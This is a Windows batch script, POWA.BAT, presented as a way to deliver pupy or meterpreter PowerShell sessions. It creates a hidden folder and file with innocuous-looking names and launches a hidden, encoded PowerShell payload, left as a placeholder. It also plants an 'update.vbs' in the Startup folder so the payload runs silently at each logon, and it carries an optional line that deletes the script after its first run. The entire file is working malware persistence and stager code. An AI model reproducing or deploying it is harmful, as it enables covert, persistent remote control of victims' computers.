REM #POWA.BAT#
REM #A batch file to assist with delivery of pupy or meterpreter reflective dll powershell sessions#
REM #Replace XXXXXXXXXXX with your own powershell code

REM First does a check to see if my directory is created, if not, creates it

if exist "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate" goto DirExists
mkdir  "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate"
attrib +h "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate"

:DirExists
REM Does a check to see if my bat file exists, if not, creates it. 

if exist "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate\powa.bat" goto FileExists
echo powershell.exe -w hidden -noni -nop -enc XXXXXXXXXXXXXXXXXX 1> "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate\powa.bat"
attrib +h "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate\powa.bat"

:FileExists
REM Has a look to see if the vbs script that runs at startup and hides the powershell window is setup, if not, sets it up

if exist "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs" goto StartExists

REM This bit created the vbs script to hide the POWA.BAT command.

ECHO Set WshShell = CreateObject("WScript.Shell")>>"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs"
ECHO WshShell^.Run chr^(34^) ^& "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\WinDate\powa.bat" ^& Chr^(34^)^,^ ^0>>"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs"
ECHO Set WshShell = Nothing>>"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs"

REM I didnt want 10000 spawns of powershell so this does a check to see if there is a powershell session running
REM If no powershell sessesion, it runs my command, if a powershell session, bat file exits

:StartExists
tasklist /FI "IMAGENAME eq powershell.exe" 2>NUL | find /I /N "powershell.exe">NUL
if "%ERRORLEVEL%"=="0" goto EndScript
powershell.exe -w hidden -noni -nop -enc XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
:EndScript
EXIT

REM This is a suicide option you can uncomment if you want the file to melt on first run. You will need to comment out the EXIT command
REM (goto) 2>nul & del "%~f0"
